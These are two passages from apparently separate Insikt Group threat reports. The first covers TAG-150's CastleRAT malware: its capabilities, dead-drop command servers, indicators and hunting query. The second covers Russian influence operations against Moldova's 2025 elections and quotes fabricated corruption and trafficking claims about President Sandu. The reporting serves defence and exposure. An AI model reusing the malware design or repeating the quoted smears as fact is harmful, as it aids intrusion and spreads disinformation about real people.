Group did not find the full infection chain linking the specific WarmCookie and CastleLoader instances, a WarmCookie sample with the same mutex was identified, which had been deployed via CastleLoader. This finding increases the likelihood that the WarmCookie sample associated with 192[.]36[.]57[.]164 was also deployed through CastleLoader, and may therefore be directly connected to 107[.]158[.]128[.]45.\nTo date, however, no public reporting has associated Play Ransomware with either WarmCookie or CastleLoader. It therefore remains possible that the victim was targeted by multiple threat actors and that the WarmCookie infection was unrelated to the Play Ransomware incident.\nCastleRAT\nCastleRAT is a RAT that includes C and Python variants sharing the following commonalities:\nCustom binary protocol using RC4 encryption with hard-coded 16-byte keys\nQueries the geolocation API ip-api[.]com to obtain location and other information through the infected host’s public IP address\nDownload and execution of executables\nRemote shell\nThe C variant of CastleRAT also includes more advanced stealing capabilities, such as keylogging and screen capturing. Both variants are in continual development. For example, C2 deaddrops hosted on Steam Community pages is a new development, first observed in late August 2025 (see Figure 4).\nFigure 4: TAG-150’s CastleRAT using Steam Community for dead drop resolving (Source: Recorded Future)\nNotably, although CastleRAT has so far only been observed deployed alongside CastleLoader and its infrastructure shows clear links to TAG-150, this does not necessarily indicate that CastleRAT was developed by the same actor(s) behind CastleLoader; it remains possible that the malware was obtained elsewhere.\nCastleRAT Python Variant\nCastleRAT is a lightweight RAT first identified by Insikt Group in early August 2025 as a CastleLoader payload. Notably, this Python variant of the malware was publicly referenced in late August under the name PyNightshade, though it remained otherwise undocumented.\nThe C variant of CastleRAT has yet to be publicly identified, but is flagged by numerous generic antivirus detections not specifically linked to any malware family. It is therefore plausible that the Python variant of CastleRAT was designed with stealth in mind, as it currently exhibits zero or very few antivirus detections. The following features have been implemented and unchanged since the CastleRAT Python variant was first observed in late July 2025:\nObtain and report country info of the public IP and system information\nGenerate ping/keep-alive messages every three seconds\nDownload and execute executables (EXEs) or dynamic-link libraries (DLLs)\nRun and report the output of cmd shell commands\nRun and report the output of PowerShell commands\nSelf-delete\nThe country information is retrieved from the well-known IP Geolocation service ip-api[.]com. The field’s status and country are queried (see Figure 5).\nFigure 5: CastleRAT Python variant request and response to Geolocation API service ip-api[.]com (Source: Recorded Future)\nThe Recorded Future Malware Intelligence query shown in Figure 6 can be used to hunt for CastleRAT Python variants.\ndynamic.network.http.sequence.request.url contains \"/line/?fields=16385\"\nFigure 6: Recorded Future Malware Intelligence query to hunt for CastleRAT Python variant (Source: Recorded Future)\nInsikt Group assesses that the Python variant of CastleRAT remains under active development. Recent updates introduced features such as encapsulating the binary protocol within WebSockets and leveraging Steam Community pages for C2 dead drops.\nCastleRAT C Variant\nThe C variant of CastleRAT incorporates significantly more functionality than the Python variant, which likely increases its susceptibility to detection by generic antivirus solutions:\nObtain and report the country and other info of the public IP and system information\nGenerate ping/keep-alive messages every six seconds\nKeylogger\nClipper\nScreencapture\nFile Upload\nFile Download\nFind and terminate browser processes\nRun and report the output of shell commands\nRun and report the output of PowerShell commands\nRegister and un-register persistence\nExecute files via injection or masquerading as a browser\nC2 deaddrops via Steam Community pages\nAs with the Python variant, the C variant queries the widely abused IP geolocation service ip-api[.]com to collect information based on the infected host’s public IP address. However, the scope of data has been expanded to include the city, ZIP code, and indicators of whether the IP is associated with a VPN, proxy, or Tor node (see Figure 7).\nFigure 7: CastleRAT C variant request and response to Geolocation API service ip-api[.]com (Source: Recorded Future)\nRecent versions of the C variant of CastleRAT have removed querying of the city and ZIP code from the ip-api[.]com output (see Figure 8).\nFigure 8: CastleRAT C variant request and response to Geolocation API service ip-api (Source: Recorded Future)\nThe Recorded Future Malware Intelligence query shown in Figure 9 can be used to hunt for CastleRAT C variants.\n\n        \nFigure 9: Recorded Future Malware Intelligence query to hunt for CastleRAT C variant (Source: Recorded Future)\nCastleRAT C variant uses the following unique Mutex objects for synchronization:\nThickwick3\nfsAiodwsfSAFuiefS\nBabaiMazai\nsPEJIOGDsionsgfdUewg\nKolokolBozhii\nFkgfIJGgJgdiJGDGHDjMGjia\nsdgiregdsssaFWIFS\nfsAiodwsfSAFuiefS2\nGoldVekRogerS\nXmGetzKAM8Bw8NCBTUYo5e\nIt is uncertain whether the Python variant will be updated to incorporate the data-stealing features of the C variant, as well as what additional capabilities the developers may introduce for detection evasion.\nVictimology\nInsikt Group identified numerous suspected victim IP addresses communicating with the Tier 1 C2 infrastructure associated with TAG-150’s various malware families. While the majority of these IP addresses appear to be geolocated in the United States, only a limited number of actual victims could be positively identified. Most victims remain unidentified and cannot be confirmed; however, Insikt Group assesses it is likely that at least some of them represent private individuals who became infected.\nMitigations\nLeverage the IoCs in Appendix A to investigate potential past or ongoing infections, both successful and attempted, and use the Recorded Future Intelligence Cloud to monitor for future IoCs associated with TAG-150 and other threat actors.\nLeverage Sigma, YARA, and Snort rules provided in Appendices C, D, and E in your SIEM or endpoint detection and response (EDR) tools to detect the presence or execution of CastleLoader and CastleRAT. In addition, use other detection rules available in the Recorded Future Intelligence Cloud.\nUse Recorded Future Network Intelligence to detect instances of data exfiltration from your corporate infrastructure to known malicious infrastructure. This can be achieved by employing specific queries and filtering the results based on your assets.\nUse the Recorded Future Intelligence Cloud to monitor TAG-150, other threat actors, and the broader cybercriminal ecosystem, ensuring visibility into the latest TTPs, preferred tools and services (for example, specific TAEs used by threat actors), and emerging developments.\nOutlook\nInsikt Group assesses that TAG-150 will continue to evolve its tooling at a rapid pace, with a particular emphasis on stealth and evasion. TAG-150 has already demonstrated technical sophistication and adaptability and Insikt Group anticipates it will further experiment with anti-detection services and techniques to remain resilient against defensive measures.\nGiven its history of deploying multiple likely self-developed malware families, including CastleLoader, CastleBot, and now CastleRAT, TAG-150 is highly likely to develop and release additional malware in the near term. Insikt Group also assesses that there is a strong possibility that the group will expand its distribution efforts, whether to increase victim reach or potentially operate in a MaaS capacity.\nInsikt

As of this writing, the IOs analyzed in this report are unlikely to have achieved any substantial successes in shaping public opinion or guiding discourse around the upcoming elections.</p>\n        <p>The Russian IOs and corresponding networks analyzed in this report — Operation Overload, Operation Undercut, Foundation to Battle Injustice, Portal Kombat, and other Russian influence assets — are consistently projecting an unfavorable view of Moldovan President Maia Sandu and the ruling Party of Action and Solidarity (PAS) to almost certainly manipulate international and domestic public perceptions by framing Moldova’s sitting leadership as corrupt and counter to Moldova’s interests. Additionally, these operations are portraying Moldova’s further integration with the EU as disastrous for its economic future and sovereignty, and Moldova as a whole as at odds with European standards and values. Further, the content being amplified by these IOs suggests that Moldova is politically and economically more closely aligned with Russia than with the EU, and that a closer relationship with the Kremlin is a more favorable alternative.</p>\n        <p>Since at least April 2025, Operation Overload (Matryoshka, Storm-1679) has almost certainly engaged in a vilification campaign against President Sandu, while also projecting Moldova as incompatible with the rest of Europe. Likewise, the Foundation to Battle Injustice has also published multiple inauthentic investigations with the key goal of damaging the credibility of President Sandu and PAS. During this timeframe, a Russia-linked IO we track as Operation Undercut has actively dedicated much of its resources to an anti-Sandu, anti-PAS, anti-European integration effort targeting Moldovan social media users, including activity we attribute to Operation Undercut on TikTok for the first time. This report also highlights recently reported covert Facebook pages associated with Moldovan oligarch Ilan Shor’s “Evrazia” organization, as well as the Shor-linked television network actively attempting to grow influence in the country, Moldova24. Finally, our research examines ongoing activities from Pravda Moldova, a pro-Russian media aggregator hyper-focused on Moldovan political affairs and part of the Portal Kombat ecosystem that was recently identified as engaging in poisoning the output of artificial intelligence chatbots.</p>\n        <p>As the September 2025 parliamentary elections approach, Insikt Group assesses that Russia-linked IOs, including both the well-documented networks discussed in this report and any newly emerging ones, will very likely scale up in volume. Despite limited evidence that these operations have meaningfully influenced voter behavior, they still pose broader risks to media integrity and public trust. Narratives undermining election security or integrity could reduce voter turnout, while media engagement with inauthentic content — rather than exposing the tactics behind it — may amplify malign messaging. To mitigate these risks, we recommend monitoring the sources identified in this report using the Recorded Future Intelligence Operations Platform to inform public messaging, bolstering election-related cyber defenses, and continuing to proactively expose malign IOs to reduce their potential impact.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>Multiple Russia-linked IOs are actively attempting to destabilize Moldova’s September 2025 parliamentary elections and degrade public confidence in the current pro-Western Moldovan leadership.</li>\n          <li>Operation Overload and the Russia-based non-governmental organization (NGO) Foundation to Battle Injustice are almost certainly engaging in separate campaigns to negatively shape international opinion toward Moldova’s European integration aspirations and to decrease public support of Moldovan President Maia Sandu.</li>\n          <li>Operation Undercut is very likely attempting to condition Moldovan audiences to expect rigged elections in favor of PAS, exploit pre-existing fears of a conventional war with Russia, and amplify economic concerns for voters.</li>\n          <li>IOs associated with Ilan Shor’s Evrazia organization and Moldova24, a very likely Shor-sponsored Russia-state-backed television network, are disseminating anti-Sandu messages targeting Moldovan audiences through social media advertising on Meta.</li>\n          <li>The very likely sole function of Pravda Moldova’s website is to serve as a high-volume amplifier and launderer of pro-Kremlin media content to Moldova’s Romanian-speaking population as part of Portal Kombat’s ecosystem.</li>\n        </ul>\n        <h2>Background</h2>\n        <p>Moldova’s September 2025 parliamentary elections are expected to decisively influence the country’s long-term future, especially the continued trajectory toward EU integration by its 2030 target date. This strategic direction was affirmed in late 2024, when Moldovan voters narrowly approved a constitutional referendum endorsing EU membership. This referendum coincided with the reelection of incumbent President Sandu, who secured approximately 55% of the vote. However, the 2024 election was subject to substantial attempted Russian <a href=\"https://www.osce.org/files/f/documents/9/d/578815_0.pdf\">interference</a>, <a href=\"https://pism.pl/publications/russian-interference-nearly-overwhelmed-moldovan-presidential-election-referendum-vote\">including</a> systematic vote-buying, covert financial support for pro-Russian candidates, malign IOs, hybrid disruptions targeting electoral infrastructure, and physical interference via bomb threats aimed at <a href=\"https://moldova1.md/p/53521/where-does-the-diaspora-vote-most-polling-stations-set-up-in-italy-russia-and-israel--two-in-each\">diaspora polling stations</a>. With the 2025 parliamentary elections effectively a “last-chance” to slow or entirely derail Moldova’s EU membership, Russian IOs and potential destabilization activities are likely to escalate.</p>\n        <h2>Covert IOs Seek to Bring Moldova Back into “Russian World”</h2>\n        <p>Insikt Group is actively tracking multiple Russia-linked IOs that target Russian- and Romanian-speaking audiences within Moldova, as well as broader international communities. These operations are almost certainly designed to delegitimize Moldova’s electoral integrity by promoting narratives alleging electoral fraud, inflaming tensions regarding diaspora voting, and discrediting the PAS. Additionally, the operations seek to weaken public support for Moldova's EU integration, exacerbate economic anxieties among Moldovan citizens, and exploit pre-existing ethnic and linguistic divisions.</p>\n        <p>Collectively, these influence activities very likely align with the Kremlin’s strategic objectives toward Moldova, specifically advancing its post-Soviet reunification doctrine of <a href=\"https://warn-erasmus.eu/glossary/ruskij-mir/\">Russkiy Mir</a> (“Russian World”) and seeking to transform Moldova into a \"<a href=\"https://en.belsat.eu/86874986/moldova-is-preparing-for-parliamentary-elections-an-expert-from-chisinau-tells-belsat-that-the-kremlin-wants-to-have-a-second-belarus-there\">second Belarus</a>.\" While initially an effort to promote Russian culture and language abroad, Russkiy Mir has since evolved into an expansionist vision of uniting Russian-speaking populations in former Soviet states regardless of internationally recognized territorial boundaries. As a former Soviet state and as a result of its significant Russian-speaking minority, Moldova remains susceptible to targeted IOs. In recent years, Russian IOs targeting Moldova have included efforts to <a href=\"https://www.fpri.org/article/2024/10/russias-information-war-in-moldova/\">provoke</a> separatist sentiments in the autonomous region of Transnistria and coordinated attempts ranging from social media <a href=\"https://dfrlab.org/2024/10/18/malign-interference-moldova/\">influence</a> to <a href=\"https://www.reuters.com/world/europe/moldova-police-say-businessman-shor-channelled-24-million-pay-off-voters-2024-10-24/\">bribery</a> tactics to influence the outcome of Moldova’s 2024 presidential elections. Meanwhile, Russia’s attempts at <a href=\"https://securingdemocracy.gmfus.org/incident/russia-attempts-to-use-gas-supply-to-gain-concessions-from-moldova/\">economic coercion</a>, namely through the disruption of gas supplies, sought to pressure Moldova into favorable political concessions, including likely attempts to slow its path toward European integration.</p>\n        <h2>Operation Overload and Foundation to Battle Injustice Vilify Maia Sandu</h2>\n        <p>Russia-linked IO Operation Overload (Matryoshka, Storm-1679) and the Russia-based “Foundation to Battle Injustice” (R-FBI, FBR) are almost certainly engaging in separate campaigns to shape negative opinion among international audiences toward Moldova’s European integration aspirations and to smear the reputation of Moldovan President Maia Sandu. Currently, Insikt Group assesses that both Operation Overload and R-FBI are operating in parallel ahead of the September 2025 parliamentary elections; however, we do not have evidence to suggest that Operation Overload or R-FBI are coordinating their efforts. Further, we have not observed attempts from either network to cross-amplify content.</p>\n        <h3>Operation Overload</h3>\n        <p>Operation Overload is a Russia-linked IO consisting of inauthentic news and fake fact-checking content that impersonates legitimate news sources. First <a href=\"https://checkfirst.network/operation-overload-how-pro-russian-actors-flood-newsrooms-with-fake-content-and-seek-to-divert-their-efforts/\">documented</a> by CheckFirst and Reset.Tech in June 2024, Operation Overload’s primary objective is to overwhelm journalists, researchers, and fact-checking organizations with non-credible leads distributed through persistent, spam-like story verification requests. As <a href=\"https://bsky.app/profile/eliothiggins.bsky.social/post/3lrfpc4inas25%20\">evidenced</a> in Bellingcat founder Eliot Higgins’s recent post of Operation Overload-administered email accounts sharing falsified “egregious news” from Moldova to his inbox (<strong>Figure 1</strong>), journalists, researchers, and fact-checking organizations almost certainly remain a priority target audience for the operation. Insikt Group coverage of the operation ahead of the 2024 United States (US) election <a href=\"https://www.recordedfuture.com/research/operation-overload-impersonates-media-influence-2024-us-election\">assessed</a> that Operation Overload also sought to directly influence the general public, both through the inadvertent laundering of its claims through trusted media organizations that fact-check the operation’s content, and by directly injecting inauthentic media into the mainstream using Telegram and social media.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1c3582ed12eeca5d9a31f79e4c4079f92469fa274.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"461\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 1:</em></strong> <em>Screenshot of a spam email sent to Bellingcat founder Eliot Higgins containing Operation Overload social media posts (Source:</em> <em><a href=\"https://bsky.app/profile/eliothiggins.bsky.social/post/3lrfpc4inas25%20\">Bluesky</a>)</em></div>\n          </div>\n        </div>\n        <h4>Narratives</h4>\n        <p>Automated social media accounts engaging in coordinated inauthentic behavior (CIB) are almost certainly promoting Operation Overload content with a substantial emphasis on degrading the public reputation of President Sandu and public perceptions of Moldova with regard to European compatibility and EU integration. Since at least April 2025, inauthentic news and other media content we attribute to Operation Overload have almost certainly sought to damage President Sandu’s reputation. The operation regularly attempts to portray President Sandu as corrupt, featuring videos containing fabricated headlines and falsified investigative research that makes claims such as, “$79 million has been found on the cryptocurrency wallets of Maia Sandu’s aides,” and “Maia Sandu’s alleged mistress has $24 million in assets … that were corruptly obtained by Sandu [per fake Bellingcat research].” A video impersonating German broadcaster Deutsche Welle that Insikt Group documented in April 2025 falsely claimed that Veronica Dragalin, former head of Moldova’s Anti-Corruption Prosecutor’s Office, was preparing to distribute material implicating Sandu to “300 European media outlets.” Other inauthentic media pieces we attribute to Operation Overload <a href=\"https://theins.ru/en/news/282348\">sought</a> to drive a wedge between or create the appearance of a growing political rivalry between President Sandu and EU High Representative Kaja Kallas, suggesting that President Sandu was seeking to take Kallas’s position.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_167f0fae78f01c21f852c4ba6da2934d0289dedaf.png?width=750&amp;format=png&amp;optimize=medium\" width=\"497\" height=\"348\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figures 2 and 3</em></strong><em>: Operation Overload videos posted to social media in April 2025, impersonating the BBC and Deutsche Welle (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1c1f2e869918ca50b3a89d69930564ddf82e96948.png?width=750&amp;format=png&amp;optimize=medium\" width=\"675\" height=\"1200\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 4</em></strong><em>: Operation Overload video impersonating Deutsche Welle, suggesting a potential political rift between Kaja Kallas and Maia Sandu (Source: Social media)</em></div>\n          </div>\n        </div>\n        <p>Starting July 8, 2025, Insikt Group observed a series of Operation Overload-produced deepfakes impersonating Moldovan government spokesperson Daniel Vodă, which are designed to appear as official government rebuttals of earlier “investigations” that the same network had fabricated. These deepfakes are almost certainly intended to create a closed-loop narrative undermining the Moldovan government while also attempting to lend false credibility to Operation Overload’s initial inauthentic media pieces. These videos, which repurpose authentic press material, add AI-generated audio, and weave in fabricated narratives, are very likely also intended to erode public trust in the Moldovan government ahead of the September 2025 parliamentary elections.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_116e0d2fbe0d55e2e14555d5beff828794bd26a18.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1059\" height=\"589\" />\n            </div>\n          </div>\n          <div>\n            <div>\n              <p><strong><em>Figure 5</em></strong><em>: Operation Overload deepfake of Moldovan government spokesperson Daniel Vodă, published July 9, 2025</em></p>\n              <p><em>(Source: Social media and</em> <em><a href=\"https://www.youtube.com/watch?v=oe1KzXK0tqE\">YouTube</a>)</em></p>\n            </div>\n          </div>\n        </div>\n        <p>Beyond videos, Operation Overload’s static influence content includes deceptively edited screenshots of social media posts, manipulated headlines of print media, and fabricated graphical imagery, such as photojournalist-documented political graffiti in public spaces.

For example, Operation Overload’s impersonations of Euronews and Agence France-Presse (AFP), shown in <strong>Figures 10–12</strong>, suggest that Moldova is “the largest hub for cybercriminals,” is “one of the largest logistics hubs for drug trafficking,” and is “the most homophobic country in Europe.” Similar non-credible storylines impersonating Western media remain ongoing and will very likely persist throughout Moldova’s election period.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1344058e1f9be52117798d5fb6240d939e3aaf0e6.png?width=750&amp;format=png&amp;optimize=medium\" width=\"523\" height=\"557\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figures 10, 11, and 12</em></strong><em>: Various Operation Overload impersonations of Euronews accusing Moldova of criminal and discriminatory activities (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <h4>Infrastructure</h4>\n        <p>We continue to observe Operation Overload-attributed media often appearing first in Russian Telegram channels, followed by CIB amplification exclusively on one social media platform, and attempted seeding on Bluesky. Mainstream social media promotion included automated resharing, liking, and amplification through “quoted replies” toward target groups (journalists, researchers, and fact-checkers), consistent with Operation Overload’s dissemination techniques throughout 2025. Beginning in late May 2025, we observed the network posting content to TikTok. The network’s social media accounts are often suspended; however, replacements soon take their place, necessitating constant efforts to detect and report new accounts.</p>\n        <p>Insikt Group considers the overwhelming majority of Operation Overload content promoted within the network to fall in the Brookings <a href=\"https://www.brookings.edu/wp-content/uploads/2020/09/Nimmo_influence_operations_PDF.pdf\">Breakout Scale</a>’s Category 2, including nearly all of the content specific to Moldova. There are isolated instances, however, where Operation Overload media impersonations <a href=\"https://www.firstpost.com/world/uae-suspends-deal-to-buy-fighter-jets-from-france-over-telegram-ceo-pavel-durov-arrest-reports-13809001.html\">garnered</a> Category 3 <a href=\"https://indiandefencereview.com/the-united-arab-emirates-did-not-cancel-the-rafale-purchase-a-baseless-rumor/\">consideration</a>, and some have even <a href=\"https://www.nytimes.com/2025/02/07/business/usaid-conspiracy-theories-disinformation.html\">reached</a> what we would assess as Category 5 (amplification through celebrities and other well-known public figures).</p>\n        <p>The success Operation Overload achieves in reaching its target audience very likely emanates from the campaign’s secondary exposure from sources that debunk its non-credible stories versus organic reach from the initial posts. The corrective reports inadvertently push the operation’s artefacts out of echo chambers and into mainstream media. Even though the coverage is “hostile” to Operation Overload, this coverage nonetheless constitutes a Category 4, or cross-medium breakout, when analyzed via the Breakout Scale.</p>\n        <h3>Foundation to Battle Injustice (R-FBI)</h3>\n        <p>R-FBI is an ongoing Russia-based IO ostensibly dedicated to exposing alleged human rights violations and injustices committed primarily by Western governments. R-FBI poses as an “independent non-profit organization” in support of addressing “human rights violations”; the organization, however, leverages non-credible, long-form investigative reporting to accuse prominent international opposition leaders, particularly during major election cycles, of serious criminal activities, including terrorism, electoral fraud, human trafficking, and sexual abuse of minors. These reports are then laundered through a network of pro-Russian influencers and websites previously identified as promoting Kremlin propaganda, such as Jamie McIntyre’s Australian National Review (ANR, <em>australiannationalreview[.]com</em> ​), the London Times (<em>londontimes[.]live</em>), and Veterans Today (VT, <em>vtforeignpolicy[.]com</em>).</p>\n        <p>R-FBI was founded and initially financed in 2021 by deceased Russian oligarch Yevgeny Prigozhin, although management of the organization has since been transferred to Oksana Vovk, known now as Mira Terada. Based on Insikt Group investigations, in addition to public reporting from researchers at <a href=\"https://open.clemson.edu/cgi/viewcontent.cgi?article=1009&amp;context=mfh_ci_reports\">Clemson University</a> and <a href=\"https://www.sgdsn.gouv.fr/files/files/Publications/20250507_TLP-CLEAR_NP_SGDSN_VIGINUM_Technical%20report_Storm-1516.pdf\">VIGINUM</a>, R-FBI is also closely involved with a separately tracked Russian IO we refer to as <a href=\"https://www.recordedfuture.com/research/russia-linked-copycop-uses-llms-to-weaponize-influence-content-at-scale\">CopyCop</a> (Storm-1516).</p>\n        <h4>Narratives</h4>\n        <p>Between late May and mid-June 2025, R-FBI published two investigative articles accusing President Sandu of engaging in illicit activities and political corruption schemes (<strong>Figures 13 and 14</strong>, below). On May 31, 2025, VT republished an R-FBI article claiming President Sandu and “affiliated organizations” were trafficking Ukrainian orphans, “under the pretext of medical treatment and adoption” into the “hands of pedophile networks and sexual slavery” across Europe. A separate article, republished by VT from R-FBI on June 19, 2025, claimed President Sandu and political allies earned “at least $4.5 billion” via large-scale illicit schemes involving “drug trafficking, Ukrainian weapons, and modern slavery.” Both articles were written by Brazilian R-FBI contributor Lucas Leiroz, also <a href=\"https://www.sgdsn.gouv.fr/files/files/Publications/20250507_TLP-CLEAR_NP_SGDSN_VIGINUM_Technical%20report_Storm-1516.pdf\">tracked</a> as an amplifier of CopyCop content. Leiroz has previously authored numerous articles featured in Russia state-sponsored media outlets, as well as in outlets <a href=\"https://2017-2021.state.gov/russias-pillars-of-disinformation-and-propaganda-report/\">previously assessed</a> as associated with Russian intelligence, such as InfoBrics (BRICS Portal) and the Strategic Culture Foundation.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1a7aa60f9859cffca93783a1069201b3af5a2614e.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"734\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figures 13 and 14</em></strong><em>: R-FBI investigative pieces republished in VT; these articles are later used as citations in social media (Source: VT [<a href=\"https://archive.is/fNwkH\">archive one</a>,</em> <em><a href=\"https://archive.is/jyLMf\">archive two</a>])</em></div>\n          </div>\n        </div>\n        <p>On July 1, 2025, R-FBI <a href=\"https://archive.is/pxMe9\">published</a> a third investigative article on Moldova, claiming President Sandu had signed a “secret decree” dated June 4, 2025, allowing law enforcement to “kill citizens without fear of punishment.” The decree, according to R-FBI, was a deliberate decision to “suppress the expected mass protests in the fall of 2025, caused by the economic crisis and expected accusations of election fraud.” R-FBI provided an alleged copy of the decree (classified as Nr. 224-S-X), which Insikt Group found no record of on the official website of the President of Moldova. R-FBI attempted to mitigate this discrepancy by stating in its article that the document was obtained from anonymous sources in the president’s office. Additional scrutiny of the document image, particularly its off-center header and incorrectly aligned Article 2, leads Insikt Group to assess the document as very likely a forgery intended to damage President Sandu’s credibility and undermine the president’s anti-corruption platform.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1b460ccd32bc85328d6c1a65f8f5574bcf04cf538.png?width=750&amp;format=png&amp;optimize=medium\" width=\"768\" height=\"1087\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 15</em></strong><em>: A very likely forgery of a Moldovan presidential decree providing immunity to law enforcement for the use of force against protestors and instances of civil unrest (Source: R-FBI [<a href=\"https://archive.is/pxMe9\">archive</a>])</em></div>\n          </div>\n        </div>\n        <h4>Infrastructure</h4>\n        <p>Likely due to the result of social media platforms’ <a href=\"https://insights.som.yale.edu/insights/how-shadow-banning-can-silently-shift-opinion-online\">shadowbanning</a> direct links to R-FBI’s website, <em>fondfbr[.]ru</em>, R-FBI is almost certainly using secondary sources through a network of intermediaries and influencers to launder its investigations, namely via VT, but also via <a href=\"https://archive.is/3wO8c\">websites</a> associated with ANR. Insikt Group also located limited secondary and tertiary amplification through the pro-Kremlin media publication <a href=\"https://archive.is/y2rFV\">EurAsia Daily</a> (EADaily) and a fringe Swedish publication that sporadically re-publishes R-FBI investigative pieces called “<a href=\"https://archive.is/q8msm\">Bakom Kulisserna</a>” (“Behind the Scenes”).</p>\n        <p>Pro-Kremlin social media personalities who have previously amplified CopyCop content are almost certainly also the leading amplifiers of R-FBI’s anti-Sandu articles, resulting in each claim receiving hundreds of thousands of social media views. In addition to Leiroz, these individuals included Chay Bowes, Raphael Machado, and social media personalities “Johnny Midnight”, “Peacemaker”, and “Sprinter Observer”. The extent of R-FBI article amplification against President Sandu is a Category 3 on the Brookings <a href=\"https://www.brookings.edu/wp-content/uploads/2020/09/Nimmo_influence_operations_PDF.pdf\">Breakout Scale</a>, consisting of multiple platforms with multiple breakouts. Similar to Operation Overload, R-FBI has achieved isolated instances of Category 4 amplification, given the numerous prior press coverage of R-FBI and its fabricated investigative pieces.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_11c14eac1abe95c91d7be53ab1a9f7c0d8803f63f.png?width=750&amp;format=png&amp;optimize=medium\" width=\"756\" height=\"396\" />\n            </div>\n          </div>\n          <div>\n            <div>\n              <p><strong><em>Figures 16 and 17</em></strong><em>: Screenshots of Chay Bowes and Johnny Midnight posts discussing R-FBI’s story republished in VT</em></p>\n              <p><em>(Source: Social media)</em></p>\n            </div>\n          </div>\n        </div>\n        <div>\n          <div>\n            <div>\n              <p>\n                <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1f1732de1d263ab83822a91392a9e67e9706a6717.png?width=750&amp;format=png&amp;optimize=medium\" width=\"708\" height=\"617\" />\n              </p>\n              <p>\n                <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_108fee76466280fb4658998dd9b55442f9567994d.png?width=750&amp;format=png&amp;optimize=medium\" width=\"764\" height=\"709\" />\n              </p>\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figures 18 and 19</em></strong><em>: R-FBI articles republished to EADaily and Bakom Kulisserna (Source:</em> <em><a href=\"https://archive.is/y2rFV\">archive one</a>,</em> <em><a href=\"https://archive.is/q8msm\">archive two</a>)</em></div>\n          </div>\n        </div>\n        <h2>Operation Undercut Targets Moldovan TikTok Users</h2>\n        <p>In early June 2025, Insikt Group identified a series of TikTok accounts promoting anti-PAS, anti-Sandu content in Romanian, which we currently attribute to <a href=\"https://www.recordedfuture.com/research/operation-undercut-shows-multifaceted-nature-sdas-influence-operations\">Operation Undercut</a>. Over the course of this investigation, we identified an additional network of approximately 70 active social media accounts (as of late June 2025) posting this content in parallel to accounts on TikTok (<strong>Appendix A</strong>). We note that many of these accounts have since been suspended; however, we continue to identify replacement accounts on a rolling basis.</p>\n        <p>Operation Undercut is an IO almost certainly conducted by the Russian company Social Design Agency (Агентсво Социального Проектирования, or “SDA”) since at least December 2023. Historically, Operation Undercut has generated very little online engagement and very likely has achieved minimal impact on its target audiences. Previously, Insikt Group observed Operation Undercut primarily using <a href=\"https://go.recordedfuture.com/hubfs/reports/TA-RU-2024-1126.pdf\">inauthentic social media and 9gag accounts</a> likely operated by humans or simulating human activity, which includes posting during typical Moscow workday hours and halting activity during major Russian holidays.</p>\n        <h3>Narratives</h3>\n        <p>Operation Undercut is very likely attempting to condition domestic Moldovan audiences to expect rigged elections in favor of PAS, stoke fears of a potential conventional war with Russia, and provoke economic concerns by magnifying priority economic issues for voters, such as inflation, agricultural collapse, and child-welfare costs. This network of Operation Undercut accounts consistently publishes content that is generally negative toward the PAS and President Sandu. Themes include framing Moldova’s EU aspirations as economically ruinous, amplifying likely non-credible claims of alleged Moldovan political corruption, and predicting a future socio-political collapse should Moldova continue its current trajectory.</p>\n        <h3>Infrastructure</h3>\n        <p>Insikt Group identified at least four Operation Undercut TikTok accounts attempting to impersonate Moldovan citizens or Romanian-speaking individuals in Eastern Europe. One account, “Bella Popescu”, claimed to be a photographer and film editor. The second account, “dorinrobu5”, dedicated its account to “news,” “reviews,” and “relevant, fresh information.” The third account, “Gergely Dezir”, described itself as an account dedicated to “peace and politics.” A fourth account we assess as likely part of the network, “moldova457u”, began posting similar Operation Undercut-style AI-generated videos in late June 2025. Each of the TikTok videos we observed stated in their descriptions that the videos were constructed using CapCut, a video editing software popular with video creators and social media influencers. This network is also very likely using <a href=\"http://VEED.io\">VEED</a>’s “<a href=\"https://www.veed.io/ai-studio/\">Gen-AI studio</a>” avatars, “Aisha”, “Elena”, and “Marcus”, to periodically narrate and lend credibility to Operation Undercut content.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_167eda03076b3287d6fb1c313ae0eec23b55cfb71.png?width=750&amp;format=png&amp;optimize=medium\" width=\"391\" height=\"465\" />\n            </div>\n          </div>\n          <div>\n            <div>\n              <p><strong><em>Figure 20</em></strong><em>: Operation Undercut using Veed avatar “Elena” to narrate anti-Sandu, anti-PAS video on social media</em></p>\n              <p><em>(Source: Social media)</em></p>\n            </div>\n          </div>\n        </div>\n        <p>Each of the clips posted to TikTok contains hashtags very likely chosen to garner potential viewers interested in Moldova and Moldovan politics (#stirimoldova, #moldovaștiri, #UE), as well as generalized hashtags used to reach a broader audience, such as 